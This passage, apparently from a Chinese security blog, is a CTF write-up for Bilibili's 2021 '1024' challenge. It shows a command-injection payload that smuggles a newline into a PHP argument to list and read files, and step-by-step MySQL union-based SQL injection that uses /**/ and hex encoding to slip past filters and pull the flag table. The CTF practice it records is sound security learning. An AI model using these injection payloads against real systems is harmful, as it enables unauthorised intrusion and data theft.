class="hljs-variable">$i</span>]);<br>        echo(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    &#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>构造payload为/sec1024/q/pro/eval.php?args[]=xxx%0a&amp;args[]=ls</p><p><img src="/2021/10/24/bilibili-1024/image-20211025112542540.png" alt="image-20211025112542540"></p><p>没有进行过滤直接cat读取得到flag</p><p><img src="/2021/10/24/bilibili-1024/image-20211025112704290.png" alt="image-20211025112704290"></p><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>和第二题的网址是一样的</p><p><del>毫无头绪找大佬py</del> 看到有人说是mysql盲注，有方向就好搞了</p><p><img src="/2021/10/24/bilibili-1024/image-20211025113905442.png" alt="image-20211025113905442"></p><p>首先找注入点，POST包是JSON格式的每个字符后面插单引号发现长度没变化所应该是数字型注入，首先判断注入点，参数user_name存在注入，这里过滤了空格（尝试用+发现也过滤了，这里使用的是内联注入），<del>掏出大宝贝直接一把梭</del></p><p><img src="/2021/10/24/bilibili-1024/image-20211025115451859.png" alt="image-20211025115451859"></p><p>gg?只能手工了，首先判断注入点</p><p><img src="/2021/10/24/bilibili-1024/image-20211025115706953.png" alt="image-20211025115706953"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025115724910.png" alt="image-20211025115724910"></p><p>user_name存在注入，则order by判断一下存在5列，直接开始注入发现mysql版本为8.0.26，数据库名为q</p><p><img src="/2021/10/24/bilibili-1024/image-20211025120032728.png" alt="image-20211025120032728"></p><p>后面就是常规操作了先注入表名再列名最后找flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">111</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>version(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(table_name)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/i</span>nformation_schema.tables<span class="hljs-regexp">/**/</span>where<span class="hljs-regexp">/**/</span>table_schema=database()<span class="hljs-comment">#</span><br><span class="hljs-string">&quot;111/**/union/**/select/**/version(),2,3,4,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#&quot;</span><br>查flag的时候会发现没有回显这是因为单引号被过滤了考虑换成%<span class="hljs-number">27</span>来绕过发现不可以只能对flag进行十六进制转换绕过<br><span class="hljs-number">111</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>version(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(id)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/bilibili-1024/image-20211025130555513.png" alt="image-20211025130555513"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025131500092.png" alt="image-20211025131500092"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025131639207.png" alt="image-20211025131639207"></p><h3 id="第五题、第六题"><a href="#第五题、第六题" class="headerlink" title="第五题、第六题"></a>第五题、第六题</h3><p>re涉及到知识盲区了，可以看看52上面大师傅的思路：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.<span class="hljs-number">52</span>pojie.cn/thread-<span class="hljs-number">1532779</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.html<br></code></pre></td></tr></table></figure><p>第七题我是直接导到excel然后筛选去重的笨方法，拿不到所有的答案(呜呜呜还是太菜了)，网上有人写了脚本可以去搜一下忘记存链接了。</p><p>题目网址:<a href="https://security.bilibili.com/sec1024/">https://security.bilibili.com/sec1024/</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
